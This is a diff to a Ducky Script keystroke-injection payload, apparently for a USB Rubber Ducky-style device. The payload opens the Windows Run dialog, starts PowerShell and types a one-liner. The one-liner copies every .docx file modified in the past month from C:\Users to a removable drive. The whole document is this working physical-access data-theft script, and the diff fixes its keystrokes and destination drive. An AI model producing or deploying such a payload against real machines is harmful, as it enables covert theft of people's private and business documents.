@@ -1,14 +1,11 @@
 REM Ducky Script
 DELAY 2000
-GUI
+GUI r
 DELAY 500
 STRING powershell
-DELAY 500
 ENTER
 DELAY 500
-ALT y
-DELAY 500
-STRING "$sourceFolder = 'C:\Users'; $destinationFolder = 'D:\'; $startDate = (Get-Date).AddMonths(-1); $endDate = Get-Date; Get-ChildItem -Path $sourceFolder -Recurse -Filter *.docx | Where-Object { $_.LastWriteTime -ge $startDate -and $_.LastWriteTime -le $endDate } | Copy-Item -Destination $destinationFolder -Container -Force"
+STRING $sourceFolder = "C:\Users"; $destinationFolder = "E:\"; $startDate = (Get-Date).AddMonths(-1); $endDate = Get-Date; Get-ChildItem -Path $sourceFolder -Recurse -Filter *.docx | Where-Object { $_.LastWriteTime -ge $startDate -and $_.LastWriteTime -le $endDate } | Copy-Item -Destination $destinationFolder -Container -Force
 ENTER
 DELAY 500
 ALT SPACE
